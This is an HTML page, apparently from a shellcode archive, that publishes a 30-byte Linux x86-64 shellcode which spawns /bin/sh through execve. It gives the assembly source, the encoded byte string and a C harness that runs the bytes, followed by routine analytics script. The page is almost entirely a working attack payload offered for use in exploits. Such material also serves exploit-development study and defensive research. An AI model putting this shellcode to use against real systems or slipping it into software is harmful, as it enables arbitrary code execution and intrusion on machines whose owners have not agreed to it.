<html><head><title>Linux/x86-64 - execve(/bin/sh); - 30 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
# Linux/x86_64 execve(&quot;/bin/sh&quot;); 30 bytes shellcode
# Date: 2010-04-26
# Author: zbt
# Tested on: x86_64 Debian GNU/Linux
 
/*
    ; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)
 
    section .text
            global _start
 
    _start:
            xor     rdx, rdx
            mov     qword rbx, '//bin/sh'
            shr     rbx, 0x8
            push    rbx
            mov     rdi, rsp
            push    rax
            push    rdi
            mov     rsi, rsp
            mov     al, 0x3b
            syscall
*/
 
int main(void)
{
    char shellcode[] =
    &quot;\x48\x31\xd2&quot;                                  // xor    %rdx, %rdx
    &quot;\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68&quot;      // mov	$0x68732f6e69622f2f, %rbx
    &quot;\x48\xc1\xeb\x08&quot;                              // shr    $0x8, %rbx
    &quot;\x53&quot;                                          // push   %rbx
    &quot;\x48\x89\xe7&quot;                                  // mov    %rsp, %rdi
    &quot;\x50&quot;                                          // push   %rax
    &quot;\x57&quot;                                          // push   %rdi
    &quot;\x48\x89\xe6&quot;                                  // mov    %rsp, %rsi
    &quot;\xb0\x3b&quot;                                      // mov    $0x3b, %al
    &quot;\x0f\x05&quot;;                                     // syscall
 
    (*(void (*)()) shellcode)();
     
    return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
